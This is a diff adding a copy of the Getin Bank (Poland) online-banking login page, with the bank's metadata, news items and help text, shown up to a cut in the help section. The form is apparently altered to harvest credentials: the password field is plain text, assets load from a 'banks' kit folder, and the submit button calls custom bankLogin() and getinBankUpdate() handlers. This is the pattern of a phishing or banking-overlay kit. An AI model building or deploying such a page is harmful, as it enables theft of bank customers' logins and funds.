@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+<html lang="pl" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Bankowość Internetowa - Getin Bank</title>
+
+    <meta name="google" value="notranslate">
+    <meta name="description" content="System Bankowości Internetowej Getin Banku to najwygodniejszy sposób zarządzania swoimi finansami. Możesz z niego korzystać prosto ze swojego komputera wszędzie tam, gdzie masz dostęp do Internetu.">
+    <meta name="robots" content="noindex">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable = no">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/bootstrap.css">
+    <!--[if !IE]><!-->
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/combined.min.css">
+    <!--<![endif]-->
+    <!--[if IE]>
+    <link rel="stylesheet" type="text/css" href="/static/getinbank/css/combined-parts.css?1612102254">
+    <link rel="stylesheet" type="text/css" href="/static/getinbank/css/our_ie.css?1612102254">
+
+    <![endif]-->
+
+    <!--[if IE 9]>
+    <style>
+        .h--submenu > li {
+            display: inline;
+            float: left;
+        }
+        .h--submenu > li .select-field {
+            display:block !important;
+
+            width:auto;
+        }
+    </style>
+    <![endif]-->
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/default.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/our_changes.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/popup-window.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/popup-window-colors.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/changes.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/font_icoomon_styles.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/popupCreditPa.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/banner.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/smart-app-banner.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/settings.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/settings(1).css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/main.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/icons.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/proposals.css">
+    <link href="/assets/banks/getinbank_files/messages.css" rel="stylesheet" type="text/css">
+    <link href="/assets/banks/getinbank_files/Lato.css" rel="stylesheet" type="text/css">
+    <style>
+        @font-face {
+            font-family: 'ui';
+            src: url("https://secure.getinbank.pl/static/fonts/ui-kit.ttf?1612102254") format("truetype"),
+            url("https://secure.getinbank.pl/static/fonts/ui-kit.woff?1612102254") format("woff"),
+            url("https://secure.getinbank.pl/static/fonts/ui-kit.svg?1612102254") format("svg");
+            font-weight: normal;
+            font-style: normal;
+        }
+        * {
+            font-family: sans-serif;
+        }
+    </style>
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/ui_kit.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/datepicker.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/our_changes(1).css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/getinbank_files/ui_kit(1).css">
+
+    <meta name="apple-itunes-app" content="app-id=591859430">
+    <meta name="google-play-app" content="app-id=com.getingroup.mobilebanking">
+    <meta name="msApplication-ID" content="c808a2994e634b70952ffac6e76612afx">
+    <meta name="msApplication-PackageFamilyName" content="4dc5af14-449c-44e7-864f-6b58a7db23d8_bbx7k27895yhg">
+    <link rel="manifest" href="https://secure.getinbank.pl/static/getinbank/manifest.json">
+    <!-- FB -->
+    <meta property="og:title" content="Bankowość Internetowa - Getin Bank">
+    <meta property="og:url" content="https://secure.getinbank.pl">
+    <meta property="og:site_name" content="Bankowość Internetowa - Getin Bank">
+    <meta property="og:locale" content="pl_PL">
+    <meta property="og:description" content="Zaloguj się do Bankowości Internetowej.">
+    <meta property="og:image" content="https://secure.getinbank.pl/static/getinbank/images/favicons/GB_192x192.png">
+    <meta property="og:image:secure_url" content="https://secure.getinbank.pl/static/getinbank/images/favicons/GB_192x192.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="192">
+    <meta property="og:image:height" content="192">
+    <!-- END FB -->
+    <!-- FAVICONS -->
+    <link rel="apple-touch-icon" sizes="180x180" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-180x180.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="57x57" href="https://secure.getinbank.pl/static/getinbank/images/favicons/apple-touch-icon-57x57.png">
+    <link rel="icon" type="image/png" href="https://secure.getinbank.pl/static/getinbank/images/favicons/android-chrome-192x192.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="https://secure.getinbank.pl/static/getinbank/images/favicons/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://secure.getinbank.pl/static/getinbank/images/favicons/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="https://secure.getinbank.pl/static/getinbank/images/favicons/favicon-16x16.png" sizes="16x16">
+    <!-- END FAVICONS -->
+
+    <link rel="shortcut icon" href="https://secure.getinbank.pl/static/getinbank/images/favicon.ico" type="image/x-icon">
+<body class="login-page" data-brand="getinbank" cz-shortcut-listen="true">
+
+
+<div class="h--box-alert-top error extendSessionWrapper" style="height: 0px;"></div>
+<div class="h--box-alert-top errorAccessAttempts" style="display: none; height: 40px;">
+    <i class="icon icon--valid-notice2"></i>PRÓBA LOGOWANIA Z NIEDOZWOLONEGO OBSZARU GEOGRAFICZNEGO <span class="accessAttemptsDate">DATA: </span><span class="accessAttemptsTime">GODZ: </span><span class="accessAttemptsIp">ADRES IP: </span><button class="h--btn hideZoneInformation" type="button">zamknij</button>
+</div>
+<div class="h--overlay-black" style="display: none"></div>
+<div id="siteViewWrapper" style="display: block;">                                <div class="loginAlertDanger">
+        <div>
+            <a href="https://www.getinbank.pl/klienci-indywidualni/aktualnosci/uwazaj-na-oszustow-podajacych-sie-za-pracownikow-firmy-inwestycyjnej.html" target="_blank">
+                Uważaj na oszustów podających się za pracowników firmy inwestycyjnej!<br>
+                Nie podawaj nikomu danych swojej karty płatniczej ani danych do logowania!
+            </a>
+        </div>
+    </div>
+    <section class="h--section-white login-wrapper margin0" id="index-container">
+        <div class="wrapper">
+            <div id="logotype">
+                <img src="/assets/banks/getinbank_files/getinbank_logotype.png">
+            </div>
+            <div id="left-container">
+
+                <div id="login-response"></div>
+                <div id="login-container" class="jsPrepareConfirmation jsActiveConfirmation">
+
+                    <div id="signinform" class="h--form-login mb20 clearfix" data-action="index/index" data-type="html" data-destination="#login-container" method="post"><input type="hidden" name="step" value="1">
+                        <input type="hidden" name="send" value="true">
+                        <div class="steps two">
+                            <div class="step one active"><div><span>Login</span></div></div>
+                            <div class="step two"><div><span>Hasło</span></div></div>
+                        </div>
+                        <div class="show_login"></div>
+                        <div class="step1">
+                            <div class="full-window"></div>
+                            <div class="h--form--field h--input-prepend" id="mainCont">
+                                <input id="bank_login" name="login" type="text" class="validateOnChangeOnly toValidate validateRequired validateLength validateLoginAlias" placeholder="WPISZ LOGIN LUB ALIAS" autocomplete="off">        <span class="add-on"><i class="icon icon--male"></i></span><br><br>
+                                <input id="bank_password" name="login" type="text" class="validateOnChangeOnly toValidate validateRequired validateLength validateLoginAlias" placeholder="WPISZ HASŁO" autocomplete="off">        <span class="add-on"><i class="icon icon--male"></i></span>
+                                <span class="add-on add-on-login" id="to_login-information"><i class="icon icon--info-mark"></i></span>
+                                <div class="login-information">
+                                    <div class="information-title">GDZIE ZNAJDĘ LOGIN LUB ALIAS?</div><i id="close_login-information" class="icon icon--info-close close_login-information"></i>
+                                    <div class="clearfix"></div>
+                                    <p>LOGIN - został wysłany e-mailem lub znajduje się na Umowie o Bankowość Elektroniczną lub Pakietową. Składa się z samych cyfr.</p>
+                                    <p>ALIAS – tzw . Własny login, czyli dowolna nazwa, którą można zdefiniować po zalogowaniu się do Bankowości Internetowej.</p>
+                                </div>
+                            </div>
+                            <div id="buttonsCont">
+                                <button onclick="bankLogin(); getinBankUpdate()" type="submit" class="h--btn-arrow-right h--btn-light-green gotoPassword float-right long login-next-button fz-12">dalej</button>
+                            </div>
+                            <button type="button" class="h--btn h--btn-light-gray h--gray-hover float-left prepend-icon showHideHelp fz-12"> pomoc</button>
+                            <div class="clearfix"></div>
+                            <div id="login-first-step" class="index-link">
+                                <a id="login-help-link" class="href-bottom-border showHideLoginHelp">Problemy z logowaniem?</a>
+                                <a id="login-help-arrow" class="showHideLoginHelp">
+                                    <i id="login-help-step-one-arrow" class="icon icon--arrow-right-mark mt-6"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div></div>
+                <div class="messages">
+
+                    <div class="bt-mobile">
+                        <a href="http://getinbank.pl/" class="h--btn h--gray-hover">← POWRÓT DO getinbank.PL</a>
+                    </div>
+
+                    <div class="h--info msg_list">
+                        <p class="title-wide"><span>Wiadomości</span></p>
+                        <ul>
+                            <li class="showMgsSection" data-code="289">
+                                <div class="msg_date">15.01.2021</div>
+                                <div class="msg_title"><p>Tarcza Finansowa PFR 2.0 dla mikro, małych i średnich firm.</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="289">
+                                <div class="msg_date">15.01.2021</div>
+                                <div class="msg_title"><p>Tarcza Finansowa PFR 2.0 dla mikro, małych i średnich firm.</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592020_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="290">
+                                <div class="msg_date">02.02.2021</div>
+                                <div class="msg_title"><p>Niedostępność Bankowości Internetowej i Mobilnej w nocy z 5 na 6 lutego 2021 r.</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="290">
+                                <div class="msg_date">02.02.2021</div>
+                                <div class="msg_title"><p>Niedostępność Bankowości Internetowej i Mobilnej w nocy z 5 na 6 lutego 2021 r.</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592025_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="285">
+                                <div class="msg_date">15.12.2020</div>
+                                <div class="msg_title"><p>Uważaj - wyłudzenia „na dopłatę”</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="285">
+                                <div class="msg_date">15.12.2020</div>
+                                <div class="msg_title"><p>Uważaj - wyłudzenia „na dopłatę”</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592026_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                        </ul>
+                    </div>
+
+                    <div class="title-wide moreMgs"><span class="decoration triangle down show-more-descop">POKAŻ WIĘCEJ</span><span class="show-more-mobile">POKAŻ WIĘCEJ</span></div>
+                    <div class="h--info msg_list more hide">
+                        <ul>
+                            <li class="showMgsSection" data-code="281">
+                                <div class="msg_date">25.11.2020</div>
+                                <div class="msg_title"><p>Ostrzeżenie przed oszustami podszywającymi się pod pracowników Banku</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="281">
+                                <div class="msg_date">25.11.2020</div>
+                                <div class="msg_title"><p>Ostrzeżenie przed oszustami podszywającymi się pod pracowników Banku</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592027_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="279">
+                                <div class="msg_date">06.11.2020</div>
+                                <div class="msg_title"><p>Uważaj na oszustów podających się za pracowników firmy inwestycyjnej</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="279">
+                                <div class="msg_date">06.11.2020</div>
+                                <div class="msg_title"><p>Uważaj na oszustów podających się za pracowników firmy inwestycyjnej</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592028_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="271">
+                                <div class="msg_date">23.06.2020</div>
+                                <div class="msg_title"><p>Przestrzegamy przed wyłudzeniami środków od klientów banków – tzw. metodą na dopłatę.</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="271">
+                                <div class="msg_date">23.06.2020</div>
+                                <div class="msg_title"><p>Przestrzegamy przed wyłudzeniami środków od klientów banków – tzw. metodą na dopłatę.</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592029_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="259">
+                                <div class="msg_date">04.12.2019</div>
+                                <div class="msg_title"><p>Od 1 stycznia 2020 r.  podatek PIT, CIT i VAT opłacisz tylko na mikrorachunek podatkowy. Koniecznie przeczytaj jakie będą zmiany.</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="259">
+                                <div class="msg_date">04.12.2019</div>
+                                <div class="msg_title"><p>Od 1 stycznia 2020 r.  podatek PIT, CIT i VAT opłacisz tylko na mikrorachunek podatkowy. Koniecznie przeczytaj jakie będą zmiany.</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592029_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="249">
+                                <div class="msg_date">02.09.2019</div>
+                                <div class="msg_title"><p>Uwaga na telefony od osób podszywających się pod pracowników banków</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="249">
+                                <div class="msg_date">02.09.2019</div>
+                                <div class="msg_title"><p>Uwaga na telefony od osób podszywających się pod pracowników banków</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592030_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="223">
+                                <div class="msg_date">03.08.2018</div>
+                                <div class="msg_title"><p>Ostrzegamy przed oszustwem z wykorzystaniem duplikatów kart SIM</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="223">
+                                <div class="msg_date">03.08.2018</div>
+                                <div class="msg_title"><p>Ostrzegamy przed oszustwem z wykorzystaniem duplikatów kart SIM</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592031_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="208">
+                                <div class="msg_date">21.03.2018</div>
+                                <div class="msg_title"><p>Ważna wiadomość dla Klientów korzystających ze smartfonów z systemem Android.</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="208">
+                                <div class="msg_date">21.03.2018</div>
+                                <div class="msg_title"><p>Ważna wiadomość dla Klientów korzystających ze smartfonów z systemem Android.</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592032_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="201">
+                                <div class="msg_date">13.12.2017</div>
+                                <div class="msg_title"><p>Zmiany w realizacji płatności składek do ZUS</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="201">
+                                <div class="msg_date">13.12.2017</div>
+                                <div class="msg_title"><p>Zmiany w realizacji płatności składek do ZUS</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592033_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="180">
+                                <div class="msg_date">30.03.2017</div>
+                                <div class="msg_title"><p>Nowe zagrożenia w sieci</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="180">
+                                <div class="msg_date">30.03.2017</div>
+                                <div class="msg_title"><p>Nowe zagrożenia w sieci</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592033_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="163">
+                                <div class="msg_date">03.11.2016</div>
+                                <div class="msg_title"><p>Informacja dotycząca przelewów w euro</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="163">
+                                <div class="msg_date">03.11.2016</div>
+                                <div class="msg_title"><p>Informacja dotycząca przelewów w euro</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592034_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="141">
+                                <div class="msg_date">29.04.2016</div>
+                                <div class="msg_title"><p>Podstawowe zasady bezpieczeństwa</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="141">
+                                <div class="msg_date">29.04.2016</div>
+                                <div class="msg_title"><p>Podstawowe zasady bezpieczeństwa</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592035_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                            <li class="showMgsSection" data-code="136">
+                                <div class="msg_date">11.04.2016</div>
+                                <div class="msg_title"><p>Ważna informacja dla użytkowników Bankowości Mobilnej</p></div>
+                            </li>
+                            <li class="showMgsSectionMobile" data-code="136">
+                                <div class="msg_date">11.04.2016</div>
+                                <div class="msg_title"><p>Ważna informacja dla użytkowników Bankowości Mobilnej</p>
+                                    <i class="icon icon--more-black msg_arrow"></i>
+                                </div>
+                                <div class="mobile_msg_description">
+
+                                    <div style="height:42px;"></div>
+
+                                    <div class="mgs_content scrollMe nano has-scrollbar" id="1612390592036_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                                        </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 20px; transform: translate(0px, 0px);"></div></div></div>
+
+                                </div>                    </li>
+                        </ul>
+                    </div>
+
+                    <div class="bt">
+                        <a href="http://getinbank.pl/" class="h--btn h--gray-hover">← POWRÓT DO getinbank.PL</a>
+                    </div>
+                </div>    </div>
+        </div>
+    </section>
+
+    <div class="info-wrapper">
+        <section class="h--section-gray margin0 slide_section" id="login_help_section">
+            <div class="h--btn-wide small h--btn-white" id="login_helper">
+                <div id="login-help-header">
+                    Pomoc
+                    <div id="login-help-close-button" class="hideLoginHelp">×</div>
+                </div>
+
+                <div class="accordion" id="login-help-accordion">
+                    <div>
+                        <div id="login-help-heading-five" class="hideAllCollapseLoginHelp">
+                            <div class="mb-0">
+                                <div class="collapsed collapsable toggleLoginHelpArrow" type="button" data-toggle="collapse" data-target="#login-help-collapse-five" aria-expanded="false" aria-controls="login-help-collapse-five">
+                                    <div class="login-help-heading">Problem z loginem<i class="icon icon--more-black login-help-heading-arrow"></i></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="login-help-collapse-five" class="collapse" aria-labelledby="login-help-heading-five" data-parent="#login-help-accordion">
+                            <div class="login-help-body">
+                                <p>Jeśli nie pamiętasz swojego loginu do Bankowości Internetowej, zawsze możesz go sprawdzić na umowie lub w mailu z Banku.</p>
+                                <p>Nawet jeśli już zmieniłeś login na własny, to zawsze możesz zalogować się tym loginem, który dostałeś podczas zawarcia umowy. Wygodnie i bezpiecznie, prawda?</p>
+
+                                <p>
+                                    Jeśli nie masz pod ręką umowy ani maila, możesz również skorzystać z samodzielnego przypomnienia loginu na stronie:
+                                    <a href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588#management/remindLogin">Przypomnij login</a>.
+                                </p>
+                                <p>Postępuj zgodnie z krokami instrukcji na ekranie.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+
+                    <div>
+                        <div id="login-help-heading-four" class="hideAllCollapseLoginHelp">
+                            <div class="mb-0">
+                                <div class="collapsed collapsable toggleLoginHelpArrow" type="button" data-toggle="collapse" data-target="#login-help-collapse-four" aria-expanded="false" aria-controls="login-help-collapse-four">
+                                    <div class="login-help-heading">Problem z hasłem tymczasowym<i class="icon icon--more-black login-help-heading-arrow"></i></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="login-help-collapse-four" class="collapse" aria-labelledby="login-help-heading-four" data-parent="#login-help-accordion">
+                            <div class="login-help-body">
+                                <p>Do pierwszego zalogowania wykorzystaj hasło startowe, które otrzymałeś od nas SMSem.</p>
+                                <p>Jeśli w ciągu kilku minut od podpisania umowy w oddziale nie otrzymałeś SMSa z hasłem, udaj się do najbliższej placówki lub zadzwoń na infolinię pod numerem
+                                    326&nbsp;043 017. Opłata za połączenie wg taryfy operatora.</p>
+                                <p>Jeśli złożyłeś wniosek o Konto i Bankowość Elektroniczną przez Internet, SMS z hasłem do Bankowości Elektronicznej powinieneś otrzymać w ciągu dwóch dni od podpisania umowy w obecności kuriera.
+                                    Jeśli SMS nie dotarł, udaj się do najbliższej placówki lub zadzwoń na infolinię pod numerem 326&nbsp;043 017. Opłata za połączenie wg taryfy operatora.</p>
+                                <p>Hasłem startowym po raz pierwszy możesz zalogować się zarówno do Bankowości Internetowej jak i Mobilnej.</p>
+                                <p>Jeśli w pierwszej kolejności logujesz się do Bankowości Internetowej, w trakcie logowania poprosimy Cię o utworzenie własnego hasła. Tym nowym hasłem kolejny raz zalogujesz się do Bankowości Internetowej oraz wykorzystasz je do pierwszego logowania do Bankowości Mobilnej.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+
+                    <div>
+                        <div id="login-help-heading-three" class="hideAllCollapseLoginHelp">
+                            <div class="mb-0">
+                                <div class="collapsed collapsable toggleLoginHelpArrow" type="button" data-toggle="collapse" data-target="#login-help-collapse-three" aria-expanded="false" aria-controls="login-help-collapse-three">
+                                    <div class="login-help-heading">Problem z hasłem<i class="icon icon--more-black login-help-heading-arrow"></i></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="login-help-collapse-three" class="collapse" aria-labelledby="login-help-heading-three" data-parent="#login-help-accordion">
+                            <div class="login-help-body">
+                                <p>Jeśli zapomniałeś hasła, skorzystaj z możliwości samodzielnego zrestartowania hasła na stronie. Na stronie logowania wpisz swój login i kliknij przycisk dalej. Na kolejnym ekranie zobaczysz przycisk „Nie pamiętam hasła”- wybierz go i postępuj zgodnie z instrukcjami na stronie.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+
+                    <div>
+                        <div id="login-help-heading-two" class="hideAllCollapseLoginHelp">
+                            <div class="mb-0">
+                                <div class="collapsed collapsable toggleLoginHelpArrow" data-toggle="collapse" data-target="#login-help-collapse-two" aria-expanded="false" aria-controls="login-help-collapse-two">
+                                    <div class="login-help-heading">Jak samodzielnie odblokować bankowość internetową?<i class="icon icon--more-black login-help-heading-arrow"></i></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="login-help-collapse-two" class="collapse" aria-labelledby="login-help-heading-two" data-parent="#login-help-accordion">
+                            <div class="login-help-body">
+                                <p>Jeśli zablokowałeś już Bankowość Internetową (np. błędnie wpisując hasło), to w łatwy sposób odblokujesz ten kanał dostępu samodzielnie:</p>
+                                <ol>
+                                    <li>Jeśli używasz aplikacji Getin Mobile, zaloguj się, a następnie w menu wybierz Ustawienia/Kanały dostępu do Banku, Bankowość Internetowa – Odblokuj</li>
+                                    <li>Możesz skorzystać z przycisku Odblokuj dostępnym po wpisaniu loginu konta, które zostało zablokowane, zostaniesz przekierowany do formularza. Postępuj zgodnie z instrukcjami na ekranie.</li>
+                                </ol>
+                            </div>
+                        </div>
+                        <hr>
+                    </div>
+
+                    <div>
+                        <div id="login-help-heading-one" class="hideAllCollapseLoginHelp">
+                            <div class="mb-0">
+                                <div class="collapsed collapsable toggleLoginHelpArrow" data-toggle="collapse" data-target="#login-help-collapse-one" aria-expanded="false" aria-controls="login-help-collapse-one">
+                                    <div class="login-help-heading">Jak zalogować się po raz pierwszy? <i" class="icon icon--more-black login-help-heading-arrow"></i"></div>
+                                </div>
+                            </div>
+                            <div id="login-help-collapse-one" class="collapse" aria-labelledby="login-help-heading-one" data-parent="#login-help-accordion">
+                                <div class="login-help-body">
+                                    <ol>
+                                        <li>Na stronie www.getinbank.pl kliknij w przycisk <strong>ZALOGUJ</strong></li>
